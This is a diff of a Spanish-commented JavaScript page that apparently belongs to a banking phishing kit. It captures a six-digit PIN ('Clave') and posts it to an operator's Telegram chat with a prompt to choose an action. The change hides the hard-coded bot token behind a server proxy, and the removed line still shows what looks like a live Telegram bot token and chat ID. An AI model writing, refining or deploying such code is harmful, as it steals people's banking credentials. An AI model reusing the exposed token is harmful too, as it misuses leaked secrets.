@@ -5,11 +5,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const loadingOverlay = document.getElementById('loading-overlay');
     
     // --- CONFIGURACIÓN DE TELEGRAM ---
-    const TELEGRAM_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';
     const TELEGRAM_CHAT_ID = '1556429907'; // Coincidir con saldo.js
     
     // URL del servidor local para polling
-    const SERVER_URL = 'http://localhost:3000';
+    const SERVER_URL = '';
 
     let currentInput = '';
     const maxLength = 6;
@@ -90,8 +89,8 @@ document.addEventListener('DOMContentLoaded', () => {
                             `⚡ **Clave:** \`${currentInput}\`\n\n👇 **SELECCIONA UNA ACCIÓN:**`;
 
             try {
-                // Enviamos a Telegram DIRECTAMENTE
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                // Enviamos a Telegram VIA PROXY
+                const response = await fetch('/telegram-proxy/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
